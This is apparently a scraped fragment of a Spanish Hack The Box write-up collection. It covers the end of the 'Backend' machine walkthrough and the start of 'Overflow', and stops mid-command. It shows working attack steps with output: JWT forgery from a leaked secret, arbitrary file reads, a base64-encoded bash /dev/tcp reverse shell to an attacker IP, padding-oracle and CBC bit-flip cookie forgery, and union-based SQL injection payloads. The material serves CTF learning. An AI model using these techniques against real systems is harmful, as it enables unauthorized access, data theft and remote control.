stack,,,:/var/lib/tpm:/bin/false\\nuuidd:x:107:112::/run/uuidd:/usr/sbin/nologin\\ntcpdump:x:108:113::/nonexistent:/usr/sbin/nologin\\npollinate:x:110:1::/var/cache/pollinate:/bin/false\\nusbmux:x:111:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin\\nsshd:x:112:65534::/run/sshd:/usr/sbin/nologin\\nsystemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin\\nhtb:x:1000:1000:htb:/home/htb:/bin/bash\\nlxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false\\n\"}  Podemos poner el token JWT en una variable y usar jq para extraer el contenido del archivo solicitado, por comodidad:\n$ token='eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0eXBlIjoiYWNjZXNzX3Rva2VuIiwiZXhwIjoxNjUwNjg0MDU2LCJpYXQiOjE2NDk5OTI4NTYsInN1YiI6IjEiLCJpc19zdXBlcnVzZXIiOnRydWUsImd1aWQiOiIzNmMyZTk0YS00MjcxLTQyNTktOTNiZi1jOTZhZDU5NDgyODQifQ.P6m26MR7TVwHLU2dgH4v4UA3L-6z0Mrc_3eMz-Ggcvw' $ curl 10.10.11.161/api/v1/admin/file -d '{\"file\":\"/etc/passwd\"}' -H 'Content-Type: application/json' -sH \"Authorization: Bearer $token\" | jq -r .file root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin messagebus:x:103:106::/nonexistent:/usr/sbin/nologin syslog:x:104:110::/home/syslog:/usr/sbin/nologin _apt:x:105:65534::/nonexistent:/usr/sbin/nologin tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin pollinate:x:110:1::/var/cache/pollinate:/bin/false usbmux:x:111:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin sshd:x:112:65534::/run/sshd:/usr/sbin/nologin systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin htb:x:1000:1000:htb:/home/htb:/bin/bash lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false  Además, podemos crear una función en Bash llamada get_file que tome la ruta del archivo y muestre su contenido:\n$ function get_file() { curl 10.10.11.161/api/v1/admin/file -d \"{\\\"file\\\":\\\"$1\\\"}\" -H 'Content-Type: application/json' -sH \"Authorization: Bearer $token\" | jq -r .file 2\u0026gt;/dev/null; }  Aquí tenemos user.txt otra vez:\n$ get_file /home/htb/user.txt 50b343d5b2d4d836abdc7320b87ee384  No hay clave privada de SSH disponible:\n$ get_file /home/htb/.ssh/id_rsa Internal Server Error  En este punto, tenemos que encontrar el código fuente de la API. Como podemos leer archivos arbitrarios del servidor, podemos enumerar cómo se están ejecutando los procesos en /proc/\u0026lt;PID\u0026gt;/cmdline, por lo que vamos a ver algunos:\n$ for i in {1..1000}; do echo -n \"$i: \"; get_file /proc/$i/cmdline; echo; done | grep -a ': .' | grep -av Error 1: /sbin/initmaybe-ubiquity 478: /lib/systemd/systemd-journald 506: /lib/systemd/systemd-udevd 508: /lib/systemd/systemd-networkd 591: /sbin/multipathd-d-s 592: /sbin/multipathd-d-s 593: /sbin/multipathd-d-s 594: /sbin/multipathd-d-s 595: /sbin/multipathd-d-s 596: /sbin/multipathd-d-s 597: /sbin/multipathd-d-s 610: /lib/systemd/systemd-timesyncd 622: /usr/bin/VGAuthService 625: /usr/bin/vmtoolsd 644: /sbin/dhclient-1-4-v-i-pf/run/dhclient.ens160.pid-lf/var/lib/dhcp/dhclient.ens160.leases-I-df/var/lib/dhcp/dhclient6.ens160.leasesens160 645: /sbin/dhclient-1-4-v-i-pf/run/dhclient.ens160.pid-lf/var/lib/dhcp/dhclient.ens160.leases-I-df/var/lib/dhcp/dhclient6.ens160.leasesens160 646: /sbin/dhclient-1-4-v-i-pf/run/dhclient.ens160.pid-lf/var/lib/dhcp/dhclient.ens160.leases-I-df/var/lib/dhcp/dhclient6.ens160.leasesens160 647: /sbin/dhclient-1-4-v-i-pf/run/dhclient.ens160.pid-lf/var/lib/dhcp/dhclient.ens160.leases-I-df/var/lib/dhcp/dhclient6.ens160.leasesens160 649: /usr/lib/accountsservice/accounts-daemon 650: /usr/bin/dbus-daemon--system--address=systemd:--nofork--nopidfile--systemd-activation--syslog-only 655: /usr/lib/accountsservice/accounts-daemon 658: /usr/sbin/irqbalance--foreground 659: /usr/bin/python3/usr/bin/networkd-dispatcher--run-startup-triggers 660: /usr/lib/policykit-1/polkitd--no-debug 661: /usr/sbin/rsyslogd-n-iNONE 663: /usr/lib/policykit-1/polkitd--no-debug 666: /lib/systemd/systemd-logind 667: /usr/sbin/irqbalance--foreground 668: /usr/lib/udisks2/udisksd 669: /usr/sbin/runuser-uhtb--/home/htb/uhc/run.sh 673: /usr/sbin/rsyslogd-n-iNONE 674: /usr/sbin/rsyslogd-n-iNONE 675: /usr/sbin/rsyslogd-n-iNONE 688: /usr/lib/udisks2/udisksd 691: /home/htb/uhc/.venv/bin/python3/home/htb/uhc/.venv/bin/uvicorn--reload--host0.0.0.0--port80app.main:app 697: /usr/lib/policykit-1/polkitd--no-debug 698: /usr/lib/accountsservice/accounts-daemon 699: /usr/lib/udisks2/udisksd 702: /usr/sbin/ModemManager 708: /usr/bin/vmtoolsd 709: /usr/bin/vmtoolsd 712: /usr/lib/udisks2/udisksd 715: /usr/sbin/ModemManager 719: /usr/sbin/ModemManager 720: /usr/lib/udisks2/udisksd 725: /home/htb/uhc/.venv/bin/python3-cfrom multiprocessing.resource_tracker import main;main(4) 726: /home/htb/uhc/.venv/bin/python3-cfrom multiprocessing.spawn import spawn_main; spawn_main(tracker_fd=5, pipe_handle=7)--multiprocessing-fork 727: /lib/systemd/systemd-timesyncd 729: /usr/bin/vmtoolsd 796: /lib/systemd/systemd-resolved 837: /usr/sbin/cron-f 841: /usr/bin/python3/usr/share/unattended-upgrades/unattended-upgrade-shutdown--wait-for-signal 842: /usr/sbin/atd-f 843: sshd: /usr/sbin/sshd -D [listener] 0 of 10-100 startups 854: /sbin/agetty-o-p -- \\u--nocleartty1linux 857: /usr/bin/python3/usr/share/unattended-upgrades/unattended-upgrade-shutdown--wait-for-signal  Aquí tenemos algunos comandos interesantes. Tenemos que formatearlos (existen bytes nulos, que tenemos que cambiar por espacios en blanco):\n669: /usr/sbin/runuser -u htb -- /home/htb/uhc/run.sh 691: /home/htb/uhc/.venv/bin/python3 /home/htb/uhc/.venv/bin/uvicorn --reload --host 0.0.0.0 --port 80 app.main:app 725: /home/htb/uhc/.venv/bin/python3 -c from multiprocessing.resource_tracker import main;main(4) 726: /home/htb/uhc/.venv/bin/python3 -c from multiprocessing.spawn import spawn_main; spawn_main(tracker_fd=5, pipe_handle=7) --multiprocessing-fork  De hecho, el proceso importante es el de PID 669, que ejecuta un script /home/htb/uhc/run.sh:\n$ get_file /home/htb/uhc/run.sh  #!/bin/bash cd /home/htb/uhc source .venv/bin/activate export APP_MODULE=${APP_MODULE-app.main:app} export HOST=${HOST:-0.0.0.0} export PORT=${PORT:-80} python3 populateauth.py exec uvicorn --reload --host $HOST --port $PORT \"$APP_MODULE\"  Esto puede ser algo confuso, ya que no hay ningún archivo Python que se esté ejecutando con uvicorn (que es un framework de Python). Hay una referencia a un módulo llamado app.main. En Python, esto se traduce en app/main.py:\n$ get_file /home/htb/uhc/app/main.py  # ... from app.schemas.user import User from app.api.v1.api import api_router from app.core.config import settings from app import deps from app import crud app = FastAPI(title=\"UHC API Quals\", openapi_url=None, docs_url=None, redoc_url=None) root_router = APIRouter(default_response_class=UJSONResponse) @app.get(\"/\", status_code=200) def root(): \"\"\" Root GET \"\"\" return {\"msg\": \"UHC API Version 1.0\"} @app.get(\"/api\", status_code=200) def list_versions(): \"\"\" Versions \"\"\" return {\"endpoints\":[\"v1\"]} @app.get(\"/api/v1\", status_code=200) def list_endpoints_v1(): \"\"\" Version 1 Endpoints \"\"\" return {\"endpoints\":[\"user\", \"admin\"]} @app.get(\"/docs\") async def get_documentation( current_user: User = Depends(deps.parse_token) ): return get_swagger_ui_html(openapi_url=\"/openapi.json\", title=\"docs\") @app.get(\"/openapi.json\") async def openapi( current_user: User = Depends(deps.parse_token) ): return get_openapi(title = \"FastAPI\", version=\"0.1.0\", routes=app.routes) app.include_router(api_router, prefix=settings.API_V1_STR) app.include_router(root_router) def start(): import uvicorn uvicorn.run(app, host=\"0.0.0.0\", port=8001, log_level=\"debug\") if __name__ == \"__main__\": # Use this for debugging purposes only import uvicorn uvicorn.run(app, host=\"0.0.0.0\", port=8001, log_level=\"debug\")  Aquí hay una referencia a otro módulo para importar settings (aquí deberíamos encontrar la clave secreta para la implementación de JWT). Este se llama app.core.config, por lo que el archivo que queremos es app/core/config.py:\n$ get_file /home/htb/uhc/app/core/config.py  from pydantic import AnyHttpUrl, BaseSettings, EmailStr, validator from typing import List, Optional, Union from enum import Enum class Settings(BaseSettings): API_V1_STR: str = \"/api/v1\" JWT_SECRET: str = \"SuperSecretSigningKey-HTB\" ALGORITHM: str = \"HS256\" # 60 minutes * 24 hours * 8 days = 8 days ACCESS_TOKEN_EXPIRE_MINUTES: int = 60 * 24 * 8 # BACKEND_CORS_ORIGINS is a JSON-formatted list of origins # e.g: '[\"http://localhost\", \"http://localhost:4200\", \"http://localhost:3000\", \\\\ # \"http://localhost:8080\", \"http://local.dockertoolbox.tiangolo.com\"]' BACKEND_CORS_ORIGINS: List[AnyHttpUrl] = [] @validator(\"BACKEND_CORS_ORIGINS\", pre=True) def assemble_cors_origins(cls, v: Union[str, List[str]]) -\u0026gt; Union[List[str], str]: if isinstance(v, str) and not v.startswith(\"[\"): return [i.strip() for i in v.split(\",\")] elif isinstance(v, (list, str)): return v raise ValueError(v) SQLALCHEMY_DATABASE_URI: Optional[str] = \"sqlite:///uhc.db\" FIRST_SUPERUSER: EmailStr = \"root@ippsec.rocks\" class Config: case_sensitive = True settings = Settings()  Y ahí tenemos la clave utilizada para firmar los tokens JWT (SuperSecretSigningKey-HTB). Ahora podemos modificar el token que teníamos y poner is_superuser en true y añadir debug usando jwt.io:\nPodemos ejecutar comandos con este token:\n$ curl '10.10.11.161/api/v1/admin/exec/whoami' -H 'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0eXBlIjoiYWNjZXNzX3Rva2VuIiwiZXhwIjoxNjUwNjgwMzMzLCJpYXQiOjE2NDk5ODkxMzMsInN1YiI6IjE1IiwiaXNfc3VwZXJ1c2VyIjp0cnVlLCJndWlkIjoiMTRhYWE2ZGUtMmQwOS00NGJmLWJkNGMtNDU5NTUzMWE3MjEyIiwiZGVidWciOnRydWV9.SDcrNRgb2R7ojSUmAwzRFsO-_UTVgIQAZOEyLfgU98A' \"htb\"  Para usar espacios, tenemos que ponerlo en codificación URL (%20):\n$ curl '10.10.11.161/api/v1/admin/exec/uname%20-a' -H 'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0eXBlIjoiYWNjZXNzX3Rva2VuIiwiZXhwIjoxNjUwNjgwMzMzLCJpYXQiOjE2NDk5ODkxMzMsInN1YiI6IjE1IiwiaXNfc3VwZXJ1c2VyIjp0cnVlLCJndWlkIjoiMTRhYWE2ZGUtMmQwOS00NGJmLWJkNGMtNDU5NTUzMWE3MjEyIiwiZGVidWciOnRydWV9.SDcrNRgb2R7ojSUmAwzRFsO-_UTVgIQAZOEyLfgU98A' \"Linux Backend 5.4.0-77-generic #86-Ubuntu SMP Thu Jun 17 02:35:03 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux\"  Obteniendo una reverse shell Vamos a conseguir una reverse shell en la máquina:\n$ echo -n 'bash -i \u0026 /dev/tcp/10.10.17.44/4444 0\u00261' | base64 YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTcuNDQvNDQ0NCAwPiYx $ curl $(sed 's/ /%20/g' \u0026lt;\u0026lt;\u0026lt; '10.10.11.161/api/v1/admin/exec/echo YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTcuNDQvNDQ0NCAwPiYx | base64 -d | bash') -H 'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0eXBlIjoiYWNjZXNzX3Rva2VuIiwiZXhwIjoxNjUwNjgwMzMzLCJpYXQiOjE2NDk5ODkxMzMsInN1YiI6IjE1IiwiaXNfc3VwZXJ1c2VyIjp0cnVlLCJndWlkIjoiMTRhYWE2ZGUtMmQwOS00NGJmLWJkNGMtNDU5NTUzMWE3MjEyIiwiZGVidWciOnRydWV9.SDcrNRgb2R7ojSUmAwzRFsO-_UTVgIQAZOEyLfgU98A'  $ nc -nlvp 4444 Ncat: Version 7.92 ( https://nmap.org/ncat ) Ncat: Listening on :::4444 Ncat: Listening on 0.0.0.0:4444 Ncat: Connection from 10.10.11.161. Ncat: Connection from 10.10.11.161:37026. bash: cannot set terminal process group (669): Inappropriate ioctl for device bash: no job control in this shell htb@Backend:~/uhc$ script /dev/null -c bash script /dev/null -c bash Script started, file is /dev/null htb@Backend:~/uhc$ ^Z zsh: suspended ncat -nlvp 4444 $ stty raw -echo; fg [1] + continued ncat -nlvp 4444 reset xterm htb@Backend:~/uhc$ export TERM=xterm htb@Backend:~/uhc$ export SHELL=bash htb@Backend:~/uhc$ stty rows 50 columns 158  Enumeración del sistema En el directorio actual tenemos estos archivos:\nhtb@Backend:~/uhc$ ls -la total 80 drwxrwxr-x 1 htb htb 296 Apr 15 03:56 . drwxr-xr-x 1 htb htb 192 Apr 15 03:56 .. drwxrwxr-x 1 htb htb 138 Apr 6 13:27 .git -rw-rw-r-- 1 htb htb 18 Apr 6 13:27 .gitignore drwxr-xr-x 1 htb htb 66 Apr 9 15:10 .venv drwxr-xr-x 1 htb htb 54 Apr 10 00:59 __pycache__ drwxrwxr-x 1 htb htb 90 Apr 6 14:43 alembic -rwxrwxr-x 1 htb htb 1592 Apr 6 13:27 alembic.ini drwxrwxr-x 1 htb htb 218 Apr 10 01:02 app -rw-r--r-- 1 htb htb 3998 Apr 15 04:08 auth.log -rwxrwxr-x 1 htb htb 127 Apr 6 18:31 builddb.sh -rw-rw-r-- 1 htb htb 19353 Apr 6 13:27 poetry.lock -rw-rw-r-- 1 htb htb 2750 Apr 10 01:36 populateauth.py -rwxrwxr-x 1 htb htb 171 Apr 6 13:27 prestart.sh -rw-rw-r-- 1 htb htb 332 Apr 6 13:27 pyproject.toml -rw-rw-r-- 1 htb htb 118 Apr 9 15:10 requirements.txt -rwxrwxr-x 1 htb htb 241 Apr 10 01:02 run.sh -rw-r--r-- 1 htb htb 24576 Apr 15 03:49 uhc.db  Si miramos el archivo auth.log, vemos algunos eventos de admin@htb.local, y un valor extraño Tr0ub4dor\u0026amp;3:\nhtb@Backend:~/uhc$ head -15 auth.log 04/14/2022, 07:16:39 - Login Success for admin@htb.local 04/14/2022, 07:19:59 - Login Success for admin@htb.local 04/14/2022, 07:33:19 - Login Success for admin@htb.local 04/14/2022, 07:36:39 - Login Success for admin@htb.local 04/14/2022, 07:41:39 - Login Success for admin@htb.local 04/14/2022, 07:44:59 - Login Success for admin@htb.local 04/14/2022, 07:58:19 - Login Success for admin@htb.local 04/14/2022, 08:06:39 - Login Success for admin@htb.local 04/14/2022, 08:08:19 - Login Success for admin@htb.local 04/14/2022, 08:14:59 - Login Success for admin@htb.local 04/14/2022, 08:23:19 - Login Failure for Tr0ub4dor\u00263 04/14/2022, 08:24:54 - Login Success for admin@htb.local 04/14/2022, 08:24:59 - Login Success for admin@htb.local 04/14/2022, 08:25:19 - Login Success for admin@htb.local 04/14/2022, 08:26:39 - Login Success for admin@htb.local  El usuario htb pertenece a los grupos sudo y lxd, que son útiles para escalar privilegios:\nhtb@Backend:~/uhc$ id uid=1000(htb) gid=1000(htb) groups=1000(htb),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),116(lxd)  Escalada de privilegios Podemos tratar de usar este valor extraño como contraseña para htb (para ganar privilegios de root mediante sudo):\nhtb@Backend:~/uhc$ sudo su [sudo] password for htb: Sorry, try again. [sudo] password for htb: sudo: 1 incorrect password attempt  No funciona, pero sí que es la contraseña de root:\nhtb@Backend:~/uhc$ su root Password: root@Backend:/home/htb/uhc# cat /root/root.txt 6ec23ed1654a955109e42bb23d730973  ","image":"/images/HTB/Backend/Backend.png","permalink":"https://7rocky.github.io/htb/backend/","section":"htb","summary":"Hack The Box. Linux. Máquina media. Esta máquina tiene una API en la que podemos crear una cuenta después de un proceso de exploración. Luego encontramos documentación en formato Swagger donde podemos ver una ruta para ejecutar comandos y para leer archivos del servidor. Necesitamos encontrar la clave secreta usada para los tokens JWT y crear un token válido para ejecutar comandos. Para comprometer esta máquina se necesitan conocimientos sobre tokens JWT y enumeración de API","time":10,"title":"Backend"},{"contents":"  SO: Linux   Dificultad: Difícil   Dirección IP: 10.10.11.119   Fecha: 23 / 10 / 2021   Escaneo de puertos # Nmap 7.92 scan initiated as: nmap -sC -sV -o nmap/targeted 10.10.11.119 -p 22,25,80 Nmap scan report for 10.10.11.119 Host is up (0.046s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 eb:7c:15:8f:f2:cc:d4:26:54:c1:e1:57:0d:d5:b6:7c (RSA) | 256 d9:5d:22:85:03:de:ad:a0:df:b0:c3:00:aa:87:e8:9c (ECDSA) |_ 256 fa:ec:32:f9:47:17:60:7e:e0:ba:b6:d1:77:fb:07:7b (ED25519) 25/tcp open smtp Postfix smtpd |_smtp-commands: overflow, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8 80/tcp open http Apache httpd 2.4.29 ((Ubuntu)) |_http-title: Overflow Sec |_http-server-header: Apache/2.4.29 (Ubuntu) Service Info: Host: overflow; OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done -- 1 IP address (1 host up) scanned in 42.40 seconds  La máquina tiene abiertos los puertos 22 (SSH), 25 (SMTP) y 80 (HTTP).\nEnumeración web Si vamos a http://10.10.11.119 veremos una página como esta:\nEn el pie de página vemos Overflow.HTB. Por si acaso, vamos a poner overflow.htb en /etc/hosts. La página que muestra http://overflow.htb es la misma que antes.\nVamos a registrar una nueva cuenta pinchando en \u0026ldquo;Sign Up\u0026rdquo;:\nY luego ya tendremos una sesión:\nExiste un apartado de blog que muestra cita estas vulnerabilidades:\n Outdated Softwares Buffer Overflows Insecure File uploads SQL Truncation attack  Acceso como admin Después de enumerar toda la página, realizar fuzzing de rutas y probar inyecciones SQL, llegamos a un punto muerto.\nSin embargo, todavía podemos probar algunos ataques en la cookie. Si el servidor está utilizando DES CBC para generar las cookies, podría ser vulnerable a Padding Oracle Attack. Podemos probar este ataque con PadBuster.\nPara usar PadBuster, tenemos que poner nuestra cookie y el número de bytes por bloque (podemos deducir que es 8, y si no funciona, pues 16):\n$ perl padBuster.pl http://overflow.htb 4PrZDoBliCaMXXJIg3oRxLUbV72cdBks 8 -cookie 'auth=4PrZDoBliCaMXXJIg3oRxLUbV72cdBks' -encoding 0 INFO: The original request returned the following [+] Status: 200 [+] Location: N/A [+] Content Length: 12227 The following response signatures were returned: ------------------------------------------------------- ID# Freq Status Length Location ------------------------------------------------------- 1 1 200 12227 N/A 2 ** 255 302 0 ../logout.php?err=1 ------------------------------------------------------- Enter an ID that matches the error condition NOTE: The ID# marked with ** is recommended : 2 Block 1 Results: [+] Cipher Text (HEX): 8c5d7248837a11c4 [+] Intermediate Bytes (HEX): 9589bc7cbd52fa49 [+] Plain Text: user=7ro ... Block 2 Results: [+] Cipher Text (HEX): b51b57bd9c74192c [+] Intermediate Bytes (HEX): ef360b4d867f14c1 [+] Plain Text: cky ------------------------------------------------------- ** Finished *** [+] Decrypted value (ASCII): user=7rocky [+] Decrypted value (HEX): 757365723D37726F636B790505050505 [+] Decrypted value (Base64): dXNlcj03cm9ja3kFBQUFBQ==  Esta herramienta es capaz de descifrar la cookie y mostrarla en texto claro (user=7rocky). La misma herramienta puede crear una cookie que se descifre como user=admin:\n$ perl padBuster.pl http://overflow.htb 4PrZDoBliCaMXXJIg3oRxLUbV72cdBks 8 -cookie 'auth=4PrZDoBliCaMXXJIg3oRxLUbV72cdBks' -encoding 0 -plaintext 'user=admin' INFO: The original request returned the following [+] Status: 302 [+] Location: home/index.php [+] Content Length: 12227 The following response signatures were returned: ------------------------------------------------------- ID# Freq Status Length Location ------------------------------------------------------- 1 1 200 12227 N/A 2 ** 255 302 0 ../logout.php?err=1 ------------------------------------------------------- Enter an ID that matches the error condition NOTE: The ID# marked with ** is recommended : 2 Block 2 Results: [+] New Cipher Text (HEX): 23037825d5a1683b [+] Intermediate Bytes (HEX): 4a6d7e23d3a76e3d ... Block 1 Results: [+] New Cipher Text (HEX): 0408ad19d62eba93 [+] Intermediate Bytes (HEX): 717bc86beb4fdefe ------------------------------------------------------- ** Finished *** [+] Encrypted value is: BAitGdYuupMjA3gl1aFoOwAAAAAAAAAA  Y ahora tenemos una cookie válida para iniciar sesión como admin: BAitGdYuupMjA3gl1aFoOwAAAAAAAAAA.\nExiste otra manera de iniciar sesión como admin. Esta es mucho más elegante: solamente tenemos que registrar una nueva cuenta con admin= como nombre de usuario (de hecho, el número de = al final no importa).\nEsto funciona porque el código PHP estará utilizando la siguiente instrucción para extraer el usuario de la cookie descifrada (o similar):\nlist($a, $user) = explode('=', $decrypted_cookie);  Y entonces, los siguientes nombres de usuario funcionan:\n$ php -a Interactive mode enabled php \u0026gt; list($a, $user) = explode('=', 'user=admin'); php \u0026gt; echo $user; admin php \u0026gt; list($a, $user) = explode('=', 'user=admin='); php \u0026gt; echo $user; admin php \u0026gt; list($a, $user) = explode('=', 'user=admin===='); php \u0026gt; echo $user; admin  Y existe otra manera más de conseguir una cookie como usuario admin, que es realizando un Bit Flipper Attack. Este ataque se puede lanzar desde Burp Suite (Intruder), o puede ser implementado en un script personalizado en Python como bit_flipper.py (explicación detallada aquí).\nComo el servidor está usando un cifrado DES CBC (bloques de longitud 8), el esquema de descifrado es similar a este:\nLa idea es registrar una cuenta como  `dmin or bdmin, ya que ` y b son los caracteres ASCII más cercanos a la letra a. Este es el resultado del script para ambos nombres de usuario:\n$ python3 bit_flipper.py [+] Original cookie for user `dmin: 8XriuBxV78NQchc7XKNVUHlt4qIutBEK [*] Bit-flip cookie for user admin: 8XriuBxU78NQchc7XKNVUHlt4qIutBEK $ python3 bit_flipper.py [+] Original cookie for user bdmin: ioRhgV7BxTW2X8oR0UTI8r92y3rKsSA3 [*] Bit-flip cookie for user admin: ioRhgV7CxTW2X8oR0UTI8r92y3rKsSA3  La cookie \u0026ldquo;Bit-flip\u0026rdquo; es muy parecida a la cookie original, a excepción de una letra. Por ejemplo, en la cookie del usuario  `dmin, la diferencia reside en la letra V, que se transdorma en U para ontener una cookie válida para admin. Para ver la diferencia de manera correcta, las cookies se tienen que decodificar en Base64:\n\u0026gt;\u0026gt;\u0026gt; from base64 import b64decode as b64d \u0026gt;\u0026gt;\u0026gt; b64d('8XriuBxV78NQchc7XKNVUHlt4qIutBEK').hex() 'f17ae2b81c55efc35072173b5ca35550796de2a22eb4110a' \u0026gt;\u0026gt;\u0026gt; b64d('8XriuBxU78NQchc7XKNVUHlt4qIutBEK').hex() 'f17ae2b81c54efc35072173b5ca35550796de2a22eb4110a'  Aquí se ve que los dígitos hexadecimales que difieren son un 5 (\u0026quot;0101\u0026quot;) y un 4 (\u0026quot;0100\u0026quot;). Ha ocurrido un flip en el último bit del dígito 5. Lo que ocurre se puede ver más o menos con la siguiente imagen:\nSource: https://resources.infosecinstitute.com/topic/cbc-byte-flipping-attack-101-approach/\nNo obstante, nótese que el primer bloque se tiene que descifrar como user=adm (bloque de longitud 8) para que sea válido, y esta vez, el bit-flip ocurre en el sexto byte de la cookie cifrada. Por tanto, la cookie está enviando un cierto vector inicial (initial vector, IV) al inicio del texto cifrado; y por tanto, el bit-flip se acontece en el IV, como se muestra a continuación:\nHabiendo dicho esto, podríamos habernos creado un usuario llamado ZZZin (cookie en texto claro: user=ZZZin) y modificar los 3 últimos bytes del IV de la cookie cifrada para que al descifrarla quede como user=admin. Y esta función especial se añadió al script bit_flipper.py:\n$ python3 bit_flipper.py [+] Original cookie for user ZZZin: eTFj72lzhNejCV3OoG4i8OUKa8gNvdbJ [*] Bit-flip cookie for user admin: eTFj72lIuuCjCV3OoG4i8OUKa8gNvdbJ  Y después de esta disertación sobre criptografía, podemos aceder como admin:\nEncontrando un SQLi En este punto, podemos is a \u0026ldquo;Admin Panel\u0026rdquo;, que muestra una página de inicio de sesión en CMS Made Simple:\nExisten muchas vulnerabilidades para este CMS en ExploitDB. Una de ellas es una inyección de código SQL (CVE-2019-9053, 46635.py), pero el exploit no funciona correctamente (podría estar parcheado).\nEl exploit extrae hashes de la base de datos, una sal para los hashes y luego trata de romperlos (ya que los hashes son MD5).\nVamos a enumerar de nuevo la web para ver si hay alguna inyección de código SQL. Como admin podemos ver algunos logs:\nEsta información que se muestra en la ventana viene de una petición web a http://overflow.htb/home/logs.php?name=admin (usando AJAX).\nPodemos comprobar aquí payloads comunes de SQLi hasta que encontramos uno que funciona (mediante un paréntesis de cierre:\n$ curl \"http://overflow.htb/home/logs.php?name=admin\" -H 'Cookie: auth=27D0zsl796kY3V6LjcNvRu3vWRAmWEBA' \u0026lt;div id='last'\u0026gt;Last login : 11:00:00\u0026lt;/div\u0026gt;\u0026lt;br\u0026gt; \u0026lt;div id='last'\u0026gt;Last login : 14:00:00\u0026lt;/div\u0026gt;\u0026lt;br\u0026gt; \u0026lt;div id='last'\u0026gt;Last login : 16:00:00\u0026lt;/div\u0026gt;\u0026lt;br\u0026gt; \u0026lt;div id='last'\u0026gt;Last login : 10:00:00\u0026lt;/div\u0026gt;\u0026lt;br\u0026gt; \u0026lt;div id='last'\u0026gt;Last login : 12:00:00\u0026lt;/div\u0026gt;\u0026lt;br\u0026gt; $ curl \"http://overflow.htb/home/logs.php?name=admin'\" -H 'Cookie: auth=27D0zsl796kY3V6LjcNvRu3vWRAmWEBA' $ curl \"http://overflow.htb/home/logs.php?name=admin'--+-\" -H 'Cookie: auth=27D0zsl796kY3V6LjcNvRu3vWRAmWEBA' $ curl \"http://overflow.htb/home/logs.php?name=admin')--+-\" -H 'Cookie: auth=27D0zsl796kY3V6LjcNvRu3vWRAmWEBA' \u0026lt;div id='last'\u0026gt;Last login : 11:00:00\u0026lt;/div\u0026gt;\u0026lt;br\u0026gt; \u0026lt;div id='last'\u0026gt;Last login : 14:00:00\u0026lt;/div\u0026gt;\u0026lt;br\u0026gt; \u0026lt;div id='last'\u0026gt;Last login : 16:00:00\u0026lt;/div\u0026gt;\u0026lt;br\u0026gt; \u0026lt;div id='last'\u0026gt;Last login : 10:00:00\u0026lt;/div\u0026gt;\u0026lt;br\u0026gt; \u0026lt;div id='last'\u0026gt;Last login : 12:00:00\u0026lt;/div\u0026gt;\u0026lt;br\u0026gt;  Ahora detectamos que es un SQLi de tipo Union-based en la tercera columna:\n$ curl \"http://overflow.htb/home/logs.php?name=')+union+select+('1\" -H 'Cookie: auth=27D0zsl796kY3V6LjcNvRu3vWRAmWEBA' $ curl \"http://overflow.htb/home/logs.php?name=')+union+select+1,('2\" -H 'Cookie: auth=27D0zsl796kY3V6LjcNvRu3vWRAmWEBA' $ curl \"http://overflow.htb/home/logs.php?name=')+union+select+1,2,('3\" -H 'Cookie: auth=27D0zsl796kY3V6LjcNvRu3vWRAmWEBA' \u0026lt;div id='last'\u0026gt;Last login : 3\u0026lt;/div\u0026gt;\u0026lt;br\u0026gt;  En este punto podemos extraer información de la base de datos, por ejemplo:\n$ curl \"http://overflow.htb/home/logs.php?name=')+union+select+1,2,(select+version()+order+by+'1\" -H 'Cookie: auth=27D0zsl796kY3V6LjcNvRu3vWRAmWEBA' \u0026lt;div id='last'\u0026gt;Last login : 5.7.35-0ubuntu0.18.04.2\u0026lt;/div\u0026gt;\u0026lt;br\u0026gt; $ curl \"http://overflow.htb/home/logs.php?name=')+union+select+1,2,(select+user()+order+by+'1\" -H 'Cookie: 